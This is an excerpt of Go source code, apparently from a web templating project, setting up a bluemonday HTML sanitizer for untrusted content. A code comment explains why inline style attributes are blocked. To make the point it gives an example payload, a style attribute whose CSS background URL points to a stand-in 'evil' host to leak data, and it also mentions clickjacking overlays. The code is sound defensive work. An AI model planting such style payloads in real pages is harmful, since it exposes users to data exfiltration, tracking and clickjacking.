...
func getHTMLSanitizer() *bluemonday.Policy {
	htmlSanitizerOnce.Do(func() {
		...
		// class/id only - NOT style. A globally-allowed `style` attribute is
		// passed through unfiltered by bluemonday (no CSS-property policy is
		// attached), so user HTML rendered via {{{raw}}} could carry
		// `style="background:url(https://evil/?c=...)"` for data-exfil/tracking
		// or absolute-positioned overlays for clickjacking on the authed page -
		// defeating the sanitizer's purpose. Apps that need inline style on
		// trusted (developer-authored) markup use {{{{var}}}} (raw, unsanitized)
		// by design; this path is for UNtrusted content.
